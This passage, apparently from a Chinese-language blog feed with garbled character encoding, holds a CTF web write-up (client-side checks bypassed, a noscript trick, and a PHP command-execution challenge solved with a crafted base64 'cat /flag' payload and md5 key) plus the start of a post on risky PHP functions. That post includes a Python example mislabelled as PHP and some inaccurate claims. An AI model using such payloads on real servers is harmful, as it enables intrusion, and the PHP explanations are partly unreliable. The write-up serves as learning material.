language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ­å–œä½ ï¼ä½ è·å¾—äº†ç¬¬äºŒéƒ¨åˆ†çš„ flag: <span class="hljs-subst">$&#123;data.flag&#125;</span>\nâ€¦â€¦\næ—¶å…‰èè‹’ï¼Œä½ æˆé•¿äº†å¾ˆå¤šï¼Œä¹Ÿå‘ç”Ÿäº†ä¸€äº›äº‹æƒ…ã€‚å»çœ‹çœ‹å§ï¼š/<span class="hljs-subst">$&#123;data.nextLevel&#125;</span>`</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;è¯·æ±‚å¤±è´¥ï¼Œè¯·æ£€æŸ¥è¾“å…¥æˆ–æœåŠ¡å™¨å“åº”ã€‚&#x27;</span>);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;è¯·æ±‚è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯:&#x27;</span>, error);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// æ§åˆ¶å°æç¤º</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;ä½ ä¼¼ä¹å¯¹è¿™é—¨å«åš4cqu1siti0nçš„è¯¾å¾ˆå¥½å¥‡ï¼Ÿé‚£å°±æ¥çœ‹çœ‹æ§åˆ¶å°å§ï¼&quot;</span>);<br>    &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¾¿å¯ä»¥ç›´æ¥åœ¨æ§åˆ¶å°å®Œæˆå‘½ä»¤æ‰§è¡Œï¼Œä¸è¿‡è¦æŒ‰ç…§jsçš„è¦æ±‚æ¥<br><img src="https://gitee.com/fogpost/photo/raw/master/202410012101434.png" srcset="/img/loading.gif" lazyload></p><p>åœ¨æˆ‘ä»¬æ²¡æœ‰åŠæ³•ä¿®æ”¹æºç æ—¶ï¼Œæˆ‘ä»¬æƒ³è¦ä¿®æ”¹é¡µé¢çš„å†…å®¹ï¼Œå¯ä»¥æŒ‰ç…§ä¸‹é¢çš„æ–¹æ³•æ¥</p><ol><li>æ‰“å¼€å¼€å‘è€…å·¥å…·</li><li>æ‰¾åˆ°æƒ³è¦ä¿®æ”¹çš„å…ƒç´ Elementé€‰é¡¹å¡ï¼Œæ‰¾åˆ°å…ƒç´ ï¼Œå³é”®é€‰æ‹©ç¼–è¾‘</li></ol><p>æ”¾ä¸Šé¢˜ç›®æºç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;overlay&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>èµ°ä¸å‡ºçš„ä¸‰å¹´ï¼Œèµ°ä¸å‡ºçš„è‹¦å¤<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>è¢«ç¾‚ç´¢æ§åˆ¶çš„å¤æ²¹æ°ä½¿ç”¨ç‹±é—¨ç–†å°å°äº†äº”æ¡æ‚Ÿ<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>ä½ èƒ½æ•‘å‡ºäº”æ¡è€å¸ˆå—ï¼Ÿ<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;seal_him&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;csrf_token&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;csrf_token&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;hfaousghashgfasbasiouwrda1_&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>è§£å°!!!<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;state&quot;</span>&gt;</span>å·²å°å°<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;message&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br>        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;DOMContentLoaded&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-keyword">const</span> form = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;seal_him&#x27;</span>);<br>            <span class="hljs-keyword">const</span> stateElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;state&#x27;</span>);<br>            <span class="hljs-keyword">const</span> messageElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;message&#x27;</span>);<br><br>            form.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;submit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) &#123;<br>                event.<span class="hljs-title function_">preventDefault</span>();<br><br>  <br>                <span class="hljs-keyword">if</span> (stateElement.<span class="hljs-property">textContent</span>.<span class="hljs-title function_">trim</span>() !== <span class="hljs-string">&#x27;è§£å°&#x27;</span>) &#123;<br>                    messageElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;å¦‚ä½•æ˜¯å¥½ï¼Ÿ&#x27;</span>;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/flag/s34l&#x27;</span>, &#123;<br>                        <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                        <span class="hljs-attr">headers</span>: &#123;<br>                            <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>                        &#125;,<br>                        <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">csrf_token</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;csrf_token&#x27;</span>).<span class="hljs-property">value</span> &#125;)<br>                    &#125;);<br><br>                    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) &#123;<br>                        <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>                        messageElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">`ç¬¬ä¸‰éƒ¨åˆ†Flag: <span class="hljs-subst">$&#123;data.flag&#125;</span>, ä½ è§£æ•‘äº†äº”æ¡æ‚Ÿï¼ä¸‹ä¸€å…³: /<span class="hljs-subst">$&#123;data.nextLevel || <span class="hljs-string">&#x27;æ— &#x27;</span>&#125;</span>`</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        messageElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;è¯·æ±‚å¤±è´¥ï¼Œè¯·é‡è¯•ã€‚&#x27;</span>;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                    messageElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;è¯·æ±‚è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯ï¼Œè¯·é‡è¯•ã€‚&#x27;</span>;<br>                &#125;<br>            &#125;);<br>        &#125;);<br>    &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹å‡ºè¦ä¿®æ”¹çš„stateä¸ºå·²å°å°<br><img src="https://gitee.com/fogpost/photo/raw/master/202410012057999.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202410012058796.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202410012058224.png" srcset="/img/loading.gif" lazyload><br>ï¼Œç›´æ¥ä¿®æ”¹åç‚¹å‡»å³å¯å®Œæˆç›®æ ‡</p><p>æœ€åä¸€ä¸ªéƒ¨åˆ†ï¼Œå¾ˆç®€å•,æ˜çœ¼äººç›´æ¥çœ‹å‡ºæ¥å’Œnoscriptæœ‰å…³ï¼Œæˆ‘ä»¬ç›´æ¥ä¿®æ”¹noscriptçš„å†…å®¹å³å¯ï¼Œç›´æ¥æ”¹æˆå¯æ‰§è¡Œçš„jscriptï¼Œæƒ³ä¸åˆ°æˆ‘ç«Ÿç„¶æé”™äº†ï¼Œæ²¡å­¦è¿‡jsä¸€ä¸‹å°±æ˜¾ç¤ºå‡ºæ¥äº†ï¼Œæˆ‘ä»¬åº”è¯¥åœ¨å¼€å‘è€…å·¥å…·ä¸­ç¦ç”¨jsï¼Œå°±ä¼šæ˜¾ç¤ºå¦ä¸€ä¸ªæŒ‰é’®<br><img src="https://gitee.com/fogpost/photo/raw/master/202410012112831.png" srcset="/img/loading.gif" lazyload></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;overlay&quot;</span>&gt;&lt;/div&gt;<br>    &lt;div class=&quot;content&quot;&gt;<br>        &lt;h1&gt;ä¼šèµ¢å—ï¼Ÿ&lt;/h1&gt;<br>        &lt;h2&gt;ç°ä»£æœ€å¼ºçš„å½’æ¥ï¼Œäº”æ¡æ‚Ÿçš„å¤æ´»å®£è¨€ï¼&lt;/h2&gt;<br>        &lt;p&gt;ç»å¯¹çš„å¼ºè€…ï¼Œç”±æ­¤è€Œç”Ÿçš„å­¤ç‹¬ï¼Œæ•™ä¼šä½ çˆ±çš„æ˜¯....&lt;/p&gt;<br>        &lt;form id=&quot;winForm&quot; action=&quot;/api/flag/Ap3x&quot; method=&quot;post&quot;&gt;<br>            &lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; id=&quot;csrf_token&quot; value=&quot;hfaousghashgfasbasiouwrda1_&quot;&gt;<br>            &lt;button type=&quot;submit&quot;&gt;ä¼šèµ¢çš„ï¼&lt;/button&gt;<br>        &lt;/form&gt;<br>        &lt;noscript&gt;<br>            &lt;form class=&quot;s&quot; action=&quot;/api/flag/Ap3x&quot; method=&quot;post&quot;&gt;<br>                &lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; id=&quot;csrf_token&quot; value=&quot;hfaousghashgfasbasiouwrda1_&quot;&gt;<br>                &lt;button type=&quot;submit&quot;&gt;æ— é‡ç©ºå¤„ï¼ï¼&lt;/button&gt;<br>            &lt;/form&gt;<br>        &lt;/noscript&gt;<br>        <br>        &lt;p id=&quot;message&quot;&gt;&lt;/p&gt;<br>        &lt;/div&gt;<br>        &lt;script&gt;<br>            document.querySelector(&#x27;form&#x27;).addEventListener(&#x27;submit&#x27;, function (event) &#123;<br>                    event.preventDefault();<br>                    alert(&quot;å®¿å‚©çš„é¢†åŸŸå¤ªå¼ºäº†ï¼Œæœ‰ä»€ä¹ˆåŠæ³•è®©ä»–çš„é¢†åŸŸå¤±æ•ˆå‘¢ï¼Ÿ&quot;);<br>                &#125;);<br><br>                (function () &#123;<br>                    const originalConsoleLog = console.log;<br>                    console.log = function () &#123;<br>                        originalConsoleLog.apply(console, arguments);<br>                        alert(&quot;ä½ è§‰å¾—ä½ èƒ½è¿™ä¹ˆç®€å•åœ°è·å–åˆ°çº¿ç´¢ï¼Ÿ&quot;);<br>                    &#125;;<br>                &#125;)();<br>        &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>è§£é‡Šä¸€ä¸‹</p><ol><li>&lt;noscript&gt;çš„å·¥ä½œæœºåˆ¶ï¼š<br>&lt;noscript&gt; æ˜¯ä¸€ç§ç‰¹æ®Šçš„ HTML æ ‡ç­¾ï¼Œå®ƒçš„å†…å®¹åªæœ‰åœ¨æµè§ˆå™¨ ç¦ç”¨äº† JavaScript æ—¶æ‰ä¼šæ˜¾ç¤ºã€‚<br>å½“ JavaScript å¤„äºå¯ç”¨çŠ¶æ€æ—¶ï¼Œæµè§ˆå™¨ä¼šå¿½ç•¥ &lt;noscript&gt; æ ‡ç­¾ä¸­çš„æ‰€æœ‰å†…å®¹ï¼Œé¡µé¢ä¸ä¼šæ¸²æŸ“æˆ–æ‰§è¡Œ &lt;noscript&gt; éƒ¨åˆ†çš„å†…å®¹ã€‚<br>åªæœ‰åœ¨ç”¨æˆ·ç¦ç”¨ JavaScript æ—¶ï¼Œæµè§ˆå™¨æ‰ä¼šå‘ˆç° &lt;noscript&gt; ä¸­çš„å†…å®¹ã€‚</li><li>JavaScript å’Œ &lt;noscript&gt; çš„äº’æ–¥å…³ç³»ï¼š<br>JavaScript æ‹¦æˆªçš„å‰ææ˜¯å®ƒè¢«å¯ç”¨ï¼šä½ é¡µé¢ä¸­çš„ JavaScript ä»£ç åªæœ‰åœ¨ JavaScript è¢«å¯ç”¨æ—¶æ‰ä¼šæ‰§è¡Œã€‚å½“ JavaScript å¯ç”¨æ—¶ï¼Œè¡¨å•æäº¤è¢« event.preventDefault() é˜»æ­¢ï¼Œç”¨æˆ·æ— æ³•æäº¤è¡¨å•ã€‚<br>&lt;noscript&gt; çš„å­˜åœ¨å‰ææ˜¯ JavaScript è¢«ç¦ç”¨ï¼šå¦‚æœ JavaScript è¢«ç¦ç”¨ï¼Œæ‰€æœ‰ JavaScript ä»£ç éƒ½ä¸ä¼šè¿è¡Œï¼Œè¡¨å•æ‹¦æˆªé€»è¾‘è‡ªç„¶ä¸ä¼šç”Ÿæ•ˆã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨ä¼šæ¸²æŸ“ &lt;noscript&gt; æ ‡ç­¾å†…çš„å†…å®¹ï¼Œå¹¶å…è®¸ç”¨æˆ·ä¸ &lt;noscript&gt; ä¸­çš„è¡¨å•è¿›è¡Œäº¤äº’ï¼Œè€Œä¸ä¼šå—åˆ° JavaScript çš„å½±å“ã€‚</li><li>&lt;noscript&gt; ä¸­è¡¨å•çš„æäº¤ï¼š<br>å½“ JavaScript è¢«ç¦ç”¨æ—¶ï¼Œ&lt;noscript&gt; æ ‡ç­¾ä¸­çš„è¡¨å•å°±ä¼šè¢«æ¸²æŸ“ï¼Œç”¨æˆ·å¯ä»¥æ­£å¸¸çœ‹åˆ°å¹¶æäº¤è¡¨å•ã€‚<br>å› ä¸ºæµè§ˆå™¨å®Œå…¨å¿½ç•¥äº† JavaScript ä»£ç ï¼Œæ‹¦æˆªå‡½æ•°æ— æ³•å½±å“ &lt;noscript&gt; å†…çš„è¡¨å•æäº¤ã€‚</li></ol><p>å¯æ¶ç«Ÿç„¶è¿˜æœ‰base64<br><img src="https://gitee.com/fogpost/photo/raw/master/202410012126644.png" srcset="/img/loading.gif" lazyload></p><h3 id="æ™ºæ¢°å±æœº"><a href="#æ™ºæ¢°å±æœº" class="headerlink" title="æ™ºæ¢°å±æœº"></a>æ™ºæ¢°å±æœº</h3><p><img src="https://gitee.com/fogpost/photo/raw/master/202410012130270.png" srcset="/img/loading.gif" lazyload><br>æ˜æ˜¾çš„robotsåè®®ï¼Œæˆ‘ä»¬ç›´æ¥è®¿é—®robots.txtï¼Œè¿›å…¥å¯¹åº”çš„phpé¡µé¢ï¼ŒæŸ¥çœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute_cmd</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decrypt_request</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$key</span></span>) </span>&#123;<br>    <span class="hljs-variable">$decoded_key</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$key</span>);<br>    <span class="hljs-variable">$reversed_cmd</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>) - <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>--) &#123;<br>        <span class="hljs-variable">$reversed_cmd</span> .= <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>];<br>    &#125;<br>    <span class="hljs-variable">$hashed_reversed_cmd</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$reversed_cmd</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$hashed_reversed_cmd</span> !== <span class="hljs-variable">$decoded_key</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Invalid key&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$decrypted_cmd</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$decrypted_cmd</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">execute_cmd</span>(<span class="hljs-title function_ invoke__">decrypt_request</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>]));<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>cmd0 ä¸ºåŸæœ¬çš„å‘½ä»¤<br>cmdä¸ºbase64(cmd0).encode<br>keyä¸ºmd5(cmd[::-1]).encode<br>ç›´æ¥æ„é€ <br>cmd&#x3D;Y2F0IC9mbGFn&amp;key&#x3D;ODc5YTU5MWM2Nzg1YTRlMTM5OGI5NmE5YTFiYzY3ZWI&#x3D;<br>è¿™ä¸ªæ˜¯cat &#x2F;flagè¿˜å¥½æ²¡æ¶å¿ƒäººæ¢åå­—</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpå‡½æ•°åˆè¯†</title>
    <link href="/2024/09/30/php%E5%88%9D%E8%AF%86/"/>
    <url>/2024/09/30/php%E5%88%9D%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡è®²å¯¹phpçš„éƒ¨åˆ†å¯èƒ½å¼•èµ·æ¼æ´çš„éƒ¨åˆ†å‡½æ•°è¿›è¡Œè®²è§£</p><span id="more"></span><h1 id="phpå‡½æ•°åˆè¯†"><a href="#phpå‡½æ•°åˆè¯†" class="headerlink" title="phpå‡½æ•°åˆè¯†"></a>phpå‡½æ•°åˆè¯†</h1><h2 id="1-phpinfo"><a href="#1-phpinfo" class="headerlink" title="1. phpinfo()"></a>1. phpinfo()</h2><p>phpinfo() å‡½æ•°ä¼šæ˜¾ç¤º PHP é…ç½®ä¿¡æ¯ä»¥åŠå½“å‰çš„ PHP ç¯å¢ƒä¿¡æ¯ï¼ŒåŒ…æ‹¬æœåŠ¡å™¨ä¿¡æ¯ã€æ“ä½œç³»ç»Ÿä¿¡æ¯ã€PHP ç‰ˆæœ¬ã€å·²å®‰è£…çš„æ‰©å±•ã€ç¯å¢ƒå˜é‡ç­‰ã€‚è¿™ä¸ªå‡½æ•°é€šå¸¸ç”¨äºè°ƒè¯•å’Œå¼€å‘è¿‡ç¨‹ä¸­æŸ¥çœ‹ PHP é…ç½®ä¿¡æ¯ã€‚</p><h2 id="2-eval"><a href="#2-eval" class="headerlink" title="2. eval()"></a>2. eval()</h2><p>eval() å‡½æ•°ä¼šå°†ä¼ å…¥çš„å­—ç¬¦ä¸²ä½œä¸º PHP ä»£ç è¿›è¡Œæ‰§è¡Œã€‚å¦‚æœä¼ å…¥çš„å­—ç¬¦ä¸²åŒ…å«æ¶æ„ä»£ç ï¼Œeval() å‡½æ•°å°†ä¼šæ‰§è¡Œè¿™äº›æ¶æ„ä»£ç ï¼Œä»è€Œå¯èƒ½å¯¼è‡´ä»£ç æ³¨å…¥æ¼æ´ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;&gt;&gt;x = <span class="hljs-number">7</span><br>&gt;&gt;&gt; <span class="hljs-keyword">eval</span>( <span class="hljs-string">&#x27;3 * x&#x27;</span> )<br><span class="hljs-number">21</span><br>&gt;&gt;&gt; <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;pow(2,2)&#x27;</span>)<br><span class="hljs-number">4</span><br>&gt;&gt;&gt; <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;2 + 2&#x27;</span>)<br><span class="hljs-number">4</span><br>&gt;&gt;&gt; n=<span class="hljs-number">81</span><br>&gt;&gt;&gt; <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;n + 4&quot;</span>)<br><span class="hljs-number">85</span><br></code></pre></td></tr></table></figure><h2 id="3-preg-replace"><a href="#3-preg-replace" class="headerlink" title="3. preg_replace()"></a>3. preg_replace()</h2><p>preg_replace() å‡½æ•°ç”¨äºæ‰§è¡Œæ­£åˆ™è¡¨è¾¾å¼æ›¿æ¢æ“ä½œã€‚å¦‚æœæ­£åˆ™è¡¨è¾¾å¼ä¸æ­£ç¡®æˆ–è€…ä¼ å…¥çš„æ›¿æ¢å­—ç¬¦ä¸²åŒ…å«æ¶æ„ä»£ç ï¼Œpreg_replace() å‡½æ•°å°†ä¼šæ‰§è¡Œè¿™äº›æ¶æ„ä»£ç ï¼Œä»è€Œå¯èƒ½å¯¼è‡´ä»£ç æ³¨å…¥æ¼æ´ã€‚</p><h2 id="4-include-å’Œ-require"><a href="#4-include-å’Œ-require" class="headerlink" title="4. include() å’Œ require()"></a>4. include() å’Œ require()</h2><ul><li>incluce åœ¨ç”¨åˆ°æ—¶åŠ è½½<br>include çš„æ–‡ä»¶ä¸­å‡ºé”™äº†ï¼Œä¸»ç¨‹åºç»§ç»­å¾€ä¸‹æ‰§è¡Œ</li><li>require åœ¨ä¸€å¼€å§‹å°±åŠ è½½<br>require çš„æ–‡ä»¶å‡ºé”™äº†ï¼Œä¸»ç¨‹åºä¹Ÿåœäº†</li><li>_once åç¼€è¡¨ç¤ºå·²åŠ è½½çš„ä¸åŠ è½½</li></ul><h2 id="5-file-get-contents"><a href="#5-file-get-contents" class="headerlink" title="5. file_get_contents()"></a>5. file_get_contents()</h2><p>file_get_contents() å‡½æ•°ç”¨äºè¯»å–æ–‡ä»¶å†…å®¹ã€‚å¦‚æœä¼ å…¥çš„æ–‡ä»¶è·¯å¾„åŒ…å«æ¶æ„ä»£ç ï¼Œfile_get_contents() å‡½æ•°å°†ä¼šæ‰§è¡Œè¿™äº›æ¶æ„ä»£ç ï¼Œä»è€Œå¯èƒ½å¯¼è‡´ä»£ç æ³¨å…¥æ¼æ´ã€‚</p><h2 id="6-system"><a href="#6-system" class="headerlink" title="6. system()"></a>6. system()</h2><p>system() å‡½æ•°ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚å¦‚æœä¼ å…¥çš„å‘½ä»¤åŒ…å«æ¶æ„ä»£ç ï¼Œsystem() å‡½æ•°å°†ä¼šæ‰§è¡Œè¿™äº›æ¶æ„ä»£ç ï¼Œä»è€Œå¯èƒ½å¯¼è‡´å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚</p><h2 id="7-exec"><a href="#7-exec" class="headerlink" title="7. exec()"></a>7. exec()</h2>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åŒºå—é“¾</title>
    <link href="/2024/09/27/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    <url>/2024/09/27/%E5%8C%BA%E5%9D%97%E9%93%BE/</url>
    
